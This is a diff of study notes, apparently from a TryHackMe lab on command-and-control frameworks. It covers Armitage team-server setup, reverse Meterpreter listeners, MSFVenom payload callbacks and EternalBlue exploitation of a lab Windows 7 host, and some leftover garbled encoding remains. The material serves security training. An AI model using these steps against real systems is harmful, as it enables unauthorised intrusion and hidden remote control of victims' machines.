+[Sliver](https://github.com/BishopFox/sliver) by [Bishop Fox](https://bishopfox.com/) is an advanced, highly customizable multi-user, CLI-based C2 framework. Sliver is written in Go, which makes reverse engineering the C2 "implants" incredibly difficult. It supports various protocols for C2 communications like WireGuard, mTLS, HTTP(S), DNS, and much more. Additionally, it supports BOF files for additional functionality, DNS Canary Domains for masking C2 communications, automatic Let's Encrypt certificate generation for HTTPS beacons, and much more. ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/9447257966d025c8927541a7adab9113.png) 
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/9447257966d025c8927541a7adab9113.png)  
+ï»¿_A Screenshot of the Sliver UI_ 
 
-ï»¿_A Screenshot of the Sliver UI_  
+### Paid C2 Frameworks
 
-### PaidÂ C2Â Frameworks
+**Cobalt Strike** 
 
-**Cobalt Strike**  
-
-[Cobalt Strike](https://www.cobaltstrike.com/)Â by Help Systems (Formerly created by Raphael Mudge) is arguably one of the most famous Command and Control frameworks next toÂ Metasploit. Much like Artimage, it is written in Java and designed to be as flexible as possible. For more information, see Cobalt Strikeâ€™sÂ [Video Training Page](https://www.youtube.com/playlist?list=PLcjpg2ik7YT6H5l9Jx-1ooRYpfvznAInJ). It offers additional insight into both Red Team Operations and the Framework by Raphael Mudge himself.
+[Cobalt Strike](https://www.cobaltstrike.com/) by Help Systems (Formerly created by Raphael Mudge) is arguably one of the most famous Command and Control frameworks next to Metasploit. Much like Artimage, it is written in Java and designed to be as flexible as possible. For more information, see Cobalt Strikeâ€™s [Video Training Page](https://www.youtube.com/playlist?list=PLcjpg2ik7YT6H5l9Jx-1ooRYpfvznAInJ). It offers additional insight into both Red Team Operations and the Framework by Raphael Mudge himself.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/573e8581dd1be594cf674cbf06271cde.png)
 
@@ -364,29 +354,29 @@ _A screenshot of the Cobalt Strike UI_
 
 **Brute Ratel**
 
-[Brute Ratel](https://bruteratel.com/)Â by Chetan Nayak or Paranoid NinjaÂ is a Command and Control framework marketed as a â€œCustomizable Command and Control Centerâ€ or â€œC4â€ framework that provides a true adversary simulation-like experience with being a uniqueÂ C2Â framework. For more information about the Framework, the author has provided aÂ [Video Training Page](https://bruteratel.com/tabs/tutorials/)Â that demonstrates many of the capabilities within the framework.
+[Brute Ratel](https://bruteratel.com/) by Chetan Nayak or Paranoid Ninja is a Command and Control framework marketed as a â€œCustomizable Command and Control Centerâ€ or â€œC4â€ framework that provides a true adversary simulation-like experience with being a unique C2 framework. For more information about the Framework, the author has provided a [Video Training Page](https://bruteratel.com/tabs/tutorials/) that demonstrates many of the capabilities within the framework.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/4afab434ea1d36584a5f7d0d7b8c2ad1.jpeg)
 
-_Screenshot of the Brute Ratel UI - Source:_Â [https://bruteratel.com/](https://bruteratel.com/)[](https://bruteratel.com/)
+_Screenshot of the Brute Ratel UI - Source:_ [https://bruteratel.com/](https://bruteratel.com/)[](https://bruteratel.com/)
 
-### OtherÂ C2Â Frameworks
+### Other C2 Frameworks
 
-For a more comprehensive list ofÂ C2Â Frameworks and their capabilities, check out the â€œ[C2Â Matrix](https://howto.thec2matrix.com/)â€, a project maintained byÂ **Jorge Orchilles**Â andÂ **Bryson Bort**. It has a far more comprehensive list of almost allÂ C2Â Frameworks that are currently available. We highly recommend that after this room, you go check it out and explore some of the otherÂ C2Â Frameworks that were not discussed in this room.
+For a more comprehensive list of C2 Frameworks and their capabilities, check out the â€œ[C2 Matrix](https://howto.thec2matrix.com/)â€, a project maintained by **Jorge Orchilles** and **Bryson Bort**. It has a far more comprehensive list of almost all C2 Frameworks that are currently available. We highly recommend that after this room, you go check it out and explore some of the other C2 Frameworks that were not discussed in this room.
 
 
 # Setting Up a C2 Framework
 ---
 
-### Let's Setup aÂ C2Â Server
+### Let's Setup a C2 Server
 
-In order to gain a better understanding of what is required to set up and administer aÂ C2Â server, we will be using Armitage. As a reminder, Armitage is aÂ GUIÂ for theÂ MetasploitÂ Framework, and because of this, it has almost all aspects of a standardÂ C2Â framework.
+In order to gain a better understanding of what is required to set up and administer a C2 server, we will be using Armitage. As a reminder, Armitage is a GUI for the Metasploit Framework, and because of this, it has almost all aspects of a standard C2 framework.
 
-  
+ 
 
 _Note: In case you're using the AttackBox, you may skip to the Preparing our Environment section._
 
-  
+ 
 
 ### Setting Up Armitage
 
@@ -394,7 +384,7 @@ _Note: In case you're using the AttackBox, you may skip to the Preparing our Env
 
 First, we must clone the repository from Gitlab:
 
-  
+ 
 
 **Installing Armitage
 
@@ -413,7 +403,7 @@ Resolving deltas: 100% (244/244), done.
 
 Next up, we must build the current release; we can do so with the following command:
 
-  
+ 
 
 **Building Armitage
 
@@ -455,75 +445,75 @@ BUILD SUCCESSFUL in 12s
 Skipping macOS build because this is not running on Darwin
 ```**
 
-After the building process finishes, the release build will be in the ./releases/unix/ folder.Â  You should check and verify that Armitage was able to be built successfully.
+After the building process finishes, the release build will be in the ./releases/unix/ folder. You should check and verify that Armitage was able to be built successfully.
 
-  
+ 
 
 Verifying Build
 
 ```shell-session
 root@kali$ cd ./release/unix/ && ls -la
 total 11000
-drwxr-xr-x 2 root root    4096 Feb  6 20:20 .
-drwxr-xr-x 4 root root    4096 Feb  6 20:20 ..
--rwxr-xr-x 1 root root      75 Feb  6 20:20 armitage
--rw-r--r-- 1 root root 4334705 Feb  6 20:20 armitage.jar
--rw-r--r-- 1 root root   25985 Feb  6 20:20 armitage-logo.png
--rw-r--r-- 1 root root     282 Feb  6 20:20 build.txt
--rw-r--r-- 1 root root 6778470 Feb  6 20:20 cortana.jar
--rw-r--r-- 1 root root    1491 Feb  6 20:20 license.txt
--rw-r--r-- 1 root root    4385 Feb  6 20:20 readme.txt
--rwxr-xr-x 1 root root    2665 Feb  6 20:20 teamserver
--rw-r--r-- 1 root root   85945 Feb  6 20:20 whatsnew.txt
+drwxr-xr-x 2 root root 4096 Feb 6 20:20 .
+drwxr-xr-x 4 root root 4096 Feb 6 20:20 ..
+-rwxr-xr-x 1 root root 75 Feb 6 20:20 armitage
+-rw-r--r-- 1 root root 4334705 Feb 6 20:20 armitage.jar
+-rw-r--r-- 1 root root 25985 Feb 6 20:20 armitage-logo.png
+-rw-r--r-- 1 root root 282 Feb 6 20:20 build.txt
+-rw-r--r-- 1 root root 6778470 Feb 6 20:20 cortana.jar
+-rw-r--r-- 1 root root 1491 Feb 6 20:20 license.txt
+-rw-r--r-- 1 root root 4385 Feb 6 20:20 readme.txt
+-rwxr-xr-x 1 root root 2665 Feb 6 20:20 teamserver
+-rw-r--r-- 1 root root 85945 Feb 6 20:20 whatsnew.txt
 ```
 
 In this folder, there are two key files that we will be using:
 
-  
+ 
 
 **Teamserver -**
 
 This is the file that will start the Armitage server that multiple users will be able to connect to. This file takes two arguments:
 
 - IP Address
-    
+ 
 
-Your fellow Red Team Operators will use the IP AddressÂ to connect to your Armitage server.  
+Your fellow Red Team Operators will use the IP Address to connect to your Armitage server. 
 
-- Â Shared Password
+- Shared Password
 
-Your fellow Red Team Operators will use the Shared PasswordÂ to access your Armitage server.  
+Your fellow Red Team Operators will use the Shared Password to access your Armitage server. 
 
-**Armitage -**  
+**Armitage -** 
 This is the file you will be using to connect to the Armitage Teamserver. Upon executing the binary, a new prompt will open up, displaying connection information and your username (this should be treated as a nickname, not a username for authentication) and password.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/628edce404a27f170a34d3a9d9464d1c.png)
 
-_Armitage's Connection InfoÂ GUI_
+_Armitage's Connection Info GUI_
 
 ### Preparing our Environment
 
-Before we can launch Armitage, we must do a few pre-flight checks to ensureÂ MetasploitÂ is configured properly. Armitage relies heavily onÂ Metasploit's Database functionality, so we must start and initialize the database before launching Armitage. In order to do so, we must execute the following commands:
+Before we can launch Armitage, we must do a few pre-flight checks to ensure Metasploit is configured properly. Armitage relies heavily on Metasploit's Database functionality, so we must start and initialize the database before launching Armitage. In order to do so, we must execute the following commands:
 
 Starting PostgreSQL
 
 ```shell-session
 root@kali$ systemctl start postgresql && systemctl status postgresql
 postgresql.service - PostgreSQL RDBMS
-   Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor preset: enabled)
-   Active: active (exited) since Sun 2022-02-06 20:16:03 GMT; 41min ago
-  Process: 1587 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
+ Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor preset: enabled)
+ Active: active (exited) since Sun 2022-02-06 20:16:03 GMT; 41min ago
+ Process: 1587 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
  Main PID: 1587 (code=exited, status=0/SUCCESS)
 
 Feb 06 20:16:03 ip-10-10-142-239 systemd[1]: Starting PostgreSQL RDBMS...
 Feb 06 20:16:03 ip-10-10-142-239 systemd[1]: Started PostgreSQL RDBMS.
 ```
 
-  
+ 
 
-Lastly, we must initialize the Database so thatÂ MetasploitÂ can use it. It's important to note that youÂ **cannot**Â be the root user when attempting to initialize theÂ MetasploitÂ Database. On theÂ **AttackBox,**Â you must use theÂ **Ubuntu**Â user.
+Lastly, we must initialize the Database so that Metasploit can use it. It's important to note that you **cannot** be the root user when attempting to initialize the Metasploit Database. On the **AttackBox,** you must use the **Ubuntu** user.
 
-  
+ 
 
 Initializing PostgreSQL Database
 
@@ -547,9 +537,7 @@ Attempting to start MSF web service...failed
 Please see /home/ubuntu/.msf4/logs/msf-ws.log for additional details.
 ```
 
-After initialization is completed, we can finally start the Armitage Team Server.Â 
-
-### Starting and Connecting to Armitage
+After initialization is completed, we can finally start the Armitage Team Server. ### Starting and Connecting to Armitage
 
 Starting Armitage's Team Server
 
@@ -565,17 +553,17 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 [*] Starting Armitage team server
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 [*] Use the following connection details to connect your clients:
-        Host: 127.0.0.2
-        Port: 55553
-        User: msf
-        Pass: P@ssw0rd123
+ Host: 127.0.0.2
+ Port: 55553
+ User: msf
+ Pass: P@ssw0rd123
 
 [*] Fingerprint (check for this string when you connect):
-        d211e51c8886113433f63b588fd5ccfc9e323059
+ d211e51c8886113433f63b588fd5ccfc9e323059
 [+] hacking is such a lonely thing, until now
 ```
 
-Once your Teamserver is up and running, we can now start the Armitage client. This is used to connect to the Teamserver and displays theÂ GUIÂ to the user.
+Once your Teamserver is up and running, we can now start the Armitage client. This is used to connect to the Teamserver and displays the GUI to the user.
 
 Starting Armitage
 
@@ -588,11 +576,11 @@ root@kali$ cd /opt/armitage/release/unix && ./armitage
 
 ```
 
-  
+ 
 
-When operating aÂ C2Â Framework, you never want to expose the management interface publicly; You should always listen on a local interface, never a public-facing one. This complicates access for fellow operators. Fortunately, there is an easy solution for this. For operators to gain access to the server, you should create a new user account for them and enableÂ SSHÂ access on the server, and they will be able toÂ SSHÂ port forwardÂ TCP/55553.Â  ArmitageÂ **explicitly denies**Â users listening on 127.0.0.1; this is because it is essentially a sharedÂ MetasploitÂ server with a "Deconfliction Server" that when multiple users are connecting to the server, you're not seeing everything that your other users are seeing. With Armitage, you must listen on your tun0/eth0 IP Address.
+When operating a C2 Framework, you never want to expose the management interface publicly; You should always listen on a local interface, never a public-facing one. This complicates access for fellow operators. Fortunately, there is an easy solution for this. For operators to gain access to the server, you should create a new user account for them and enable SSH access on the server, and they will be able to SSH port forward TCP/55553. Armitage **explicitly denies** users listening on 127.0.0.1; this is because it is essentially a shared Metasploit server with a "Deconfliction Server" that when multiple users are connecting to the server, you're not seeing everything that your other users are seeing. With Armitage, you must listen on your tun0/eth0 IP Address.
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/250523e0ea93b10e42c3515c6b812609.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/250523e0ea93b10e42c3515c6b812609.png) 
 
 _Modify the Host IP Address to whatever you set in the previous step, "Starting Armitage's Team Server"._
 
@@ -614,47 +602,47 @@ Now that Armitage is set up and working correctly, in the next task, we will lea
 # C2 Operation Basics
 ---
 
-### ï»¿Accessing and Managing yourÂ C2Â Infrastructure
+### ï»¿Accessing and Managing your C2 Infrastructure
 
-Now that we have a general idea of how to set up aÂ C2Â Server, we will go over some basic operational details that you should know when accessing yourÂ C2Â Server. It's important to note that you areÂ **not**Â required to perform any actions in this task - This is meant to gain general experience and familiarity with Command and Control Frameworks.
+Now that we have a general idea of how to set up a C2 Server, we will go over some basic operational details that you should know when accessing your C2 Server. It's important to note that you are **not** required to perform any actions in this task - This is meant to gain general experience and familiarity with Command and Control Frameworks.
 
-  
+ 
 
 Basic Operational Security
 
-We briefly touched on this in the last section; You should never have yourÂ C2Â management interface directly accessible. This is primarily for you to improve operational security. It can be incredibly easy to fingerprintÂ C2Â servers. For example, in versions prior to 3.13, Cobalt StrikeÂ C2Â servers were able to be identified by an extra space (\x20) at the end of theÂ HTTPÂ Response. Using this tactic, many Blue Teamers could fingerprint all of the Cobalt StrikeÂ C2Â servers publicly accessible. For more information on fingerprinting and identifying Cobalt StrikeÂ C2Â Servers, check out this posted on theÂ [Recorded Future blog](https://www.recordedfuture.com/cobalt-strike-servers/).
+We briefly touched on this in the last section; You should never have your C2 management interface directly accessible. This is primarily for you to improve operational security. It can be incredibly easy to fingerprint C2 servers. For example, in versions prior to 3.13, Cobalt Strike C2 servers were able to be identified by an extra space (\x20) at the end of the HTTP Response. Using this tactic, many Blue Teamers could fingerprint all of the Cobalt Strike C2 servers publicly accessible. For more information on fingerprinting and identifying Cobalt Strike C2 Servers, check out this posted on the [Recorded Future blog](https://www.recordedfuture.com/cobalt-strike-servers/).
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e81ca61b06e861e6f3a4f58660cc2e76.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e81ca61b06e861e6f3a4f58660cc2e76.png) 
 
-_Screenshot from a Hex Editor depicting the extra space at the end of anÂ HTTPÂ Response_
+_Screenshot from a Hex Editor depicting the extra space at the end of an HTTP Response_
 
-  
+ 
 
-The point in mentioning this is that you want to reduce your operational security risk as much as possible. If this means not having the management interface for yourÂ C2Â server publicly accessible, then, by all means, you should do it.
+The point in mentioning this is that you want to reduce your operational security risk as much as possible. If this means not having the management interface for your C2 server publicly accessible, then, by all means, you should do it.
 
-  
+ 
 
-Accessing your RemoteÂ C2Â Server that's Listening Locally
+Accessing your Remote C2 Server that's Listening Locally
 
-This section will be focusing on how to securely access yourÂ C2Â server byÂ SSHÂ port-forwarding; if you have port-forwarded withÂ SSHÂ before, feel free to skip over this section, you may not learn anything new. For those unfamiliar,Â SSHÂ port-forwarding allows us to either host resources on a remote machine by forwarding a local port to the remote server, or allows us to access local resources on the remote machine we are connecting to.Â  In some circumstances, this may be for circumventing Firewalls.
+This section will be focusing on how to securely access your C2 server by SSH port-forwarding; if you have port-forwarded with SSH before, feel free to skip over this section, you may not learn anything new. For those unfamiliar, SSH port-forwarding allows us to either host resources on a remote machine by forwarding a local port to the remote server, or allows us to access local resources on the remote machine we are connecting to. In some circumstances, this may be for circumventing Firewalls.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/bc96eabae5235e893e22417d2cc2301f.png)
 
-_FirewallÂ BlocksÂ TCP/8080_
+_Firewall Blocks TCP/8080_
 
 Or, in our instance, this could be done for operational security reasons.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7edda600836d41987311316908354439.png)
 
-_FirewallÂ AllowsÂ TCP/22, allowing us to accessÂ TCP/8080 overÂ TCP/22_
+_Firewall Allows TCP/22, allowing us to access TCP/8080 over TCP/22_
 
-  
+ 
 
-Now that we have a better understanding of why we want toÂ SSHÂ port forward, let's go over the how.
+Now that we have a better understanding of why we want to SSH port forward, let's go over the how.
 
-In ourÂ C2Â set up from Task 4, our Teamserver is listening on localhost onÂ TCP/55553. In order to access Remote port 55553, we must set up a Local port-forward to forward our local port to the remote Teamserver server. We can do this with the -L flag on ourÂ SSHÂ client:
+In our C2 set up from Task 4, our Teamserver is listening on localhost on TCP/55553. In order to access Remote port 55553, we must set up a Local port-forward to forward our local port to the remote Teamserver server. We can do this with the -L flag on our SSH client:
 
-  
+ 
 
 SSHPort Forward
 
@@ -664,47 +652,43 @@ root@kali$ echo "Connected"
 Connected
 ```
 
-Now that we have anÂ SSHÂ remote port forward set up, you can now connect to yourÂ C2Â server running onÂ TCP/55553. As a reminder, Armitage doesÂ **not**Â support listening on a loopback interface (127.0.0.1-127.255.255.255), so this isÂ generalÂ C2Â server admin advice. You will find this advice more centric toÂ C2Â servers like Covenant, Empire, and many others.
+Now that we have an SSH remote port forward set up, you can now connect to your C2 server running on TCP/55553. As a reminder, Armitage does **not** support listening on a loopback interface (127.0.0.1-127.255.255.255), so this is general C2 server admin advice. You will find this advice more centric to C2 servers like Covenant, Empire, and many others.
 
-We highly recommend puttingÂ firewallÂ rules in place forÂ C2Â servers that must listen on a public interfaceÂ so only the intended users can access yourÂ C2Â server. There are various ways to do this. If you are hosting Cloud infrastructure, you can set up a Security Group or use a host-basedÂ firewallÂ solution like UFW or IPTables.
+We highly recommend putting firewall rules in place for C2 servers that must listen on a public interface so only the intended users can access your C2 server. There are various ways to do this. If you are hosting Cloud infrastructure, you can set up a Security Group or use a host-based firewall solution like UFW or IPTables.
 
-  
+ 
 
 Creating a Listener in Armitage
 
-Next, we're going to move onto a topic that allÂ C2Â servers have - this being listener creation. To stay on topic, we will demonstrate how to set up a basic listener with Armitage then explore some of the other theoretical listeners you may encounter in various otherÂ C2Â Frameworks.Â Let's create a basicÂ MeterpreterÂ Listener running onÂ TCP/31337. To start, click on the Armitage dropdown and go over to the "Listeners" section; you should see three options, Bind, Reverse, and set LHOST. Bind refers to Bind Shells; you must connect to these hosts. Reverse refers to standard Reverse Shells; this is the option we will be using.  
+Next, we're going to move onto a topic that all C2 servers have - this being listener creation. To stay on topic, we will demonstrate how to set up a basic listener with Armitage then explore some of the other theoretical listeners you may encounter in various other C2 Frameworks. Let's create a basic Meterpreter Listener running on TCP/31337. To start, click on the Armitage dropdown and go over to the "Listeners" section; you should see three options, Bind, Reverse, and set LHOST. Bind refers to Bind Shells; you must connect to these hosts. Reverse refers to standard Reverse Shells; this is the option we will be using. 
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1ad92c6b503433e43a906c0d6719f137.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1ad92c6b503433e43a906c0d6719f137.png) 
 
 _Creating a Listener in Armitage_
 
-  
+ 
 
-After clicking "Reverse," a new menu will open up, prompting you to configure some basic details about the listener, specifically what port you want to listen on and what listener type you would like to select. There are two options you can choose from, "Shell" or "Meterpreter". Shell refers to a standard netcat-style reverse shell, andÂ MeterpreterÂ is the standardÂ MeterpreterÂ reverse shell.
+After clicking "Reverse," a new menu will open up, prompting you to configure some basic details about the listener, specifically what port you want to listen on and what listener type you would like to select. There are two options you can choose from, "Shell" or "Meterpreter". Shell refers to a standard netcat-style reverse shell, and Meterpreter is the standard Meterpreter reverse shell.
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/f1799890a05592fcc5338efd4edf281b.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/f1799890a05592fcc5338efd4edf281b.png) 
 
 _Configuring the Listener_
 
-  
+ 
 
-After pressing enter, a new pane will open up, confirming that your listener has been created. This should look like the standardÂ MetasploitÂ exploit/multi/handler module.
+After pressing enter, a new pane will open up, confirming that your listener has been created. This should look like the standard Metasploit exploit/multi/handler module.
 
-  
+ 
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7bc806ea13495e55eb82fc5c399d8876.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7bc806ea13495e55eb82fc5c399d8876.png) 
 
 _Listener successfully configured_
 
-  
+ 
 
-After setting up a listener, you can generate a standard windows/meterpreter/reverse_tcp reverse shell using MSFvenom and set the LHOST to the Armitage server to receiveÂ callbacks to our Armitage server.Â 
+After setting up a listener, you can generate a standard windows/meterpreter/reverse_tcp reverse shell using MSFvenom and set the LHOST to the Armitage server to receive callbacks to our Armitage server. **Getting a Callback**
 
-  
-
-**Getting a Callback**
-
-  
+ 
 
 MSFVenom Payload Generation
 
@@ -720,7 +704,7 @@ Saved as: shell.exe
 
 After generating the windows/meterpreter/reverse_tcp using MSFVenom, we can transfer the payload to a target machine and execute it. After a moment or two, you should receive a callback from the machine.
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1dcc8962d5a595690a9b5ea9c4888dad.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1dcc8962d5a595690a9b5ea9c4888dad.png) 
 
 _Callback from the Victim_
 
@@ -728,21 +712,15 @@ Listener Type
 
 As previously mentioned, standard reverse shell listeners are not the only ones that exist; there are many varieties that use many different protocols; however, there are a few common ones that we will cover, these being the following:
 
-**Standard Listener -**Â 
+**Standard Listener -** These often communicate directly over a raw TCP or UDP socket, sending commands in cleartext. Metasploit has full support for generic listeners.
 
-These often communicate directly over a rawÂ TCPÂ orÂ UDPÂ socket, sending commands in cleartext.Â MetasploitÂ has full support for generic listeners.
+**HTTP/HTTPS Listeners -** These often front as some sort of Web Server and use techniques like Domain Fronting or Malleable C2 profiles to mask a C2 server. When specifically communicating over HTTPS, it's less likely for communications to be blocked by an NGFW. Metasploit has full support for HTTP/HTTPS listeners.
 
-**HTTP/HTTPS Listeners -**Â 
+**DNS Listener -**
 
-These often front as some sort of Web Server and use techniques like Domain Fronting or MalleableÂ C2Â profiles to mask aÂ C2Â server. When specifically communicating over HTTPS, it's less likely for communications to be blocked by an NGFW.Â MetasploitÂ has full support forÂ HTTP/HTTPS listeners.
+DNS Listeners are a popular technique specifically used in the exfiltration stage where additional infrastructure is normally required to be set up, or at the very least, a Domain Name must be purchased and registered, and a public NS server must be configured. It is possible to set up DNS C2 operations in Metasploit with the help of additional tools. For more information, see this "[Meterpreter over DNS](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf)" presentation by Alexey Sintsov and Maxim Andreyanov. These are often very useful for bypassing Network Proxies.
 
-**DNSÂ Listener -**
-
-DNSÂ Listeners are a popular technique specifically used in the exfiltration stage where additional infrastructure is normally required to be set up, or at the very least, a Domain Name must be purchased and registered, and a public NS server must be configured. It is possible to set upÂ DNSÂ C2Â operations inÂ MetasploitÂ with the help of additional tools. For more information, see this "[MeterpreterÂ overÂ DNS](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf)" presentation by Alexey Sintsov and Maxim Andreyanov. These are often very useful for bypassing Network Proxies.
-
-**SMBÂ Listener -**Â 
-
-Communicating viaÂ SMBÂ named pipes is a popular method of choice, especially when dealing with a restricted network; it often enables more flexible pivoting with multiple devices talking to each other and only one device reaching back out over a more common protocol likeÂ HTTP/HTTPS.Â MetasploitÂ has support for Named Pipes.
+**SMB Listener -** Communicating via SMB named pipes is a popular method of choice, especially when dealing with a restricted network; it often enables more flexible pivoting with multiple devices talking to each other and only one device reaching back out over a more common protocol like HTTP/HTTPS. Metasploit has support for Named Pipes.
 
 
 ![Pasted image 20250512125248.png](../../../IMAGES/Pasted%20image%2020250512125248.png)
@@ -755,89 +733,85 @@ Communicating viaÂ SMBÂ named pipes is a popular method of choice, especiall
 
 **Host Enumeration with Armitage**
 
-Before letting you go off on your own, we're going to demonstrate how to exploit a sample Virtual Machine. First, we will execute a port scan within Armitage by going to the "Hosts" section, hovering over "NmapÂ Scan", and selecting "Quick Scan".
+Before letting you go off on your own, we're going to demonstrate how to exploit a sample Virtual Machine. First, we will execute a port scan within Armitage by going to the "Hosts" section, hovering over "Nmap Scan", and selecting "Quick Scan".
 
-  
+ 
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/6306202489d3cfdb126cd940ebb90896.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/6306202489d3cfdb126cd940ebb90896.png) 
 
-_Armitage submenu of Hosts ->Â NmapÂ Scan -> Quick Scan_
+_Armitage submenu of Hosts -> Nmap Scan -> Quick Scan_
 
-  
+ 
 
 After selecting "Quick scan", a new option will pop up; this will prompt you to enter the IP Address range you would like to scan. You should enter the IP Address of the deployed Virtual machine in this box.
 
-  
+ 
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1a12f245a88dbf0985a127e97e8a9734.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1a12f245a88dbf0985a127e97e8a9734.png) 
 
 _Input menu of "Enter Scan Range" with the IP Address VICTIM_MACHINE_
 
-  
+ 
 
 After pressing "Ok", and waiting a moment or two, you should see a new tab open up called "nmap" and a new machine display in the "Workspace" window. In the "nmap" tab, you will see the raw scan results.
 
-  
+ 
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/ef05d79307bdcf6326751ee531daa538.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/ef05d79307bdcf6326751ee531daa538.png) 
 
-_Results from theÂ NmapÂ port-scan_
+_Results from the Nmap port-scan_
 
-  
+ 
 
 Now that you have learned how to execute a basic port scan, try to execute various other scans against the target and see what additional information you may retrieve from a host.
 
-_Hint: A Comprehensive Scan will grab banners, enumerate software versions, enumerateÂ OSÂ versions, and much more!_  
+_Hint: A Comprehensive Scan will grab banners, enumerate software versions, enumerate OS versions, and much more!_ 
 
 **Exploitation with Armitage**
 
-Next up, we're going to show off exploitation with Armitage; our victim in our example is a Windows 7 machine (more specifically, Blue). This machine is vulnerable to the classic exploit "EternalÂ  Blue".Â  To find this, we will focus on the far right tab with folders, we will expand the "Exploit" dropdown, then find the "Windows" dropdown, then the "SMB" dropdown, then you will see all of the exploits.
+Next up, we're going to show off exploitation with Armitage; our victim in our example is a Windows 7 machine (more specifically, Blue). This machine is vulnerable to the classic exploit "Eternal Blue". To find this, we will focus on the far right tab with folders, we will expand the "Exploit" dropdown, then find the "Windows" dropdown, then the "SMB" dropdown, then you will see all of the exploits.
 
-  
+ 
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/0e382aaec1230fd7582b4d1ef2e5a5fb.png)  
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/0e382aaec1230fd7582b4d1ef2e5a5fb.png) 
 
 _Listing all the exploits within Armitage_
 
-  
+ 
 
-Next up, you can double click your exploit of choice, or drag and drop the exploit onto the host, and a new window will open up. Clicking "launch" will fire off the exploit.Â 
+Next up, you can double click your exploit of choice, or drag and drop the exploit onto the host, and a new window will open up. Clicking "launch" will fire off the exploit. ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/5db55dc8c10ed0048e6aa62f2291d260.png) 
 
-  
+_Eternal Blue Exploit Module Information_
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/5db55dc8c10ed0048e6aa62f2291d260.png)  
+After clicking "Launch", you will notice a new "Exploit" tab open up. Armitage will run all of the regular checks that Metasploit normally does. In the case of Eternal Blue, it ran the standard check script followed by the exploit script until it got a successful shell. It's worth noting that by default in this Exploit, it chose a Bind shell. Make sure you fully read the exploit information and options to see if a Bind Shell or a Reverse Shell is an option.
 
-_Eternal Blue ExploitÂ  Module Information_
-
-After clicking "Launch", you will notice a new "Exploit" tab open up. Armitage will run all of the regular checks thatÂ MetasploitÂ normally does. In the case of Eternal Blue, it ran the standard check script followed by the exploit script until it got a successful shell. It's worth noting that by default in this Exploit, it chose a Bind shell. Make sure you fully read the exploit information and options to see if a Bind Shell or a Reverse Shell is an option.
-
-  
+ 
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/d26c03ba17e96c1e5ca70ca8a7b76260.png)
 
 _A Successful Exploitation Attempt from Armitage_
 
-  
+ 
 
-After you receive your shell, right-click on the host and select "Interact". This will open a standard shell you're familiar with. In order to get aÂ MeterpreterÂ shell, we recommend that you run the multi/manage/shell_to_meterpreter module.
+After you receive your shell, right-click on the host and select "Interact". This will open a standard shell you're familiar with. In order to get a Meterpreter shell, we recommend that you run the multi/manage/shell_to_meterpreter module.
 
-  
+ 
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/b08eff73b568e5d4ccc8d4be6a915b88.png)
 
-_CompromisedÂ Host in Armitage_
+_Compromised Host in Armitage_
 
-Practice Time  
+Practice Time 
 
